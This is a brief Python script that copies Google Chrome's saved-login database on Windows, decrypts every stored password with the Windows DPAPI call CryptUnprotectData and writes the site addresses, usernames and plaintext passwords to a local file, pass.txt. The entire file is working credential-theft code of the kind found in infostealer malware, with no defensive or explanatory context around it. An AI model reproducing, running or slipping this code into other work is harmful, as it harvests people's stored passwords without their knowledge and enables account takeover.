import os
import shutil
import sqlite3
import win32crypt


def chrome_passwords():
    try:
        path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
        pathcopy = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\LoginDataCopy"
        shutil.copyfile(path, pathcopy)
        connectionSQLite = sqlite3.connect(pathcopy)
        cursor = connectionSQLite.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        credential = {}

        for res in cursor.fetchall():
            try:
                pswd = win32crypt.CryptUnprotectData(res[2])[1]
                login = res[1]
                url = res[0]
                credential[url] = (login, pswd)
            except Exception as e:
                print(e)
                continue

        connectionSQLite.close()

        file = open('pass.txt', 'w')
        for url, credentials in credential.items():
            if credentials[1]:
                file.write(
                    "\n" + url + "\n" + str(credentials[0].encode('utf-8')) + " | " + str(credentials[1]) + "\n")
            else:
                file.write("\n" + url + "\n" + "USERNAME NOT FOUND | PASSWORD NOT FOUND")
        file.close()
        print("Success ")
    except Exception as e:
        print(e)


